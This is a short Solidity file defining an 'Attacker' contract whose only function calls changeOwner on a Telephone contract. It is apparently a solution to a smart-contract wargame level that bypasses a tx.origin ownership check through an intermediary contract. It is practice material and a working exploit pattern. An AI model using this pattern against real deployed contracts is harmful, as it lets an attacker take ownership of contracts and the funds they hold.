pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

import "./Telephone.sol";

/**
 * Contract that will call a Telephone contract's changeOwner method. 
 */
contract Attacker {
    
    /**
     * Calls the specified Telephone contract to change the owner. 
     * 
     * @param _telephone the address of the target Telephone contract 
     * @param _owner the address of the new owner 
     */
    function changeOwner(address _telephone, address _owner) public {  
        Telephone(_telephone).changeOwner(_owner);
    }
}